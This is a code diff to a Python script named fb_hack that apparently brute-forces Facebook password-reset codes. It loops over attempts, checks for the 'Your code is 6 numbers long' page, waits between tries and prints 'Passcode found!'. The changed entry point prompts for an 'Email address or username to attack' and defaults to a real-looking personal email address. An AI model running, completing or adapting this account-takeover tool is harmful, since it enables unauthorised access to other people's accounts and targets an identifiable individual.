@@ -79,6 +79,7 @@ def fb_hack(email, codex):
         soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
         if check1 != test:
           sleepy(30)
+          attempt1 += 1
         else:
           break
   else:
@@ -98,6 +99,7 @@ def fb_hack(email, codex):
         soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
         if check1 != test:
           sleepy(30)
+          attempt1 += 1
         else:
           break
   
@@ -107,6 +109,7 @@ if soup.find(string="password_new") == test:
   print("Passcode not found")
   with open("output1.html", "w") as file:
       file.write(str(soup))
+  reset = attempt1
 elif soup.find(string="password_new") != test:
   print("Passcode found!")
   print(y)
@@ -115,9 +118,6 @@ elif soup.find(string="password_new") != test:
 return reset
 
 os.system('clear')
-try:
-  fb_hack(ehack, reset)
-except:
-  ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
-  reset = int(input('Code: ') or 1)
-
+ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
+reset = int(input('Code: ') or 1)
+fb_hack(ehack, reset)
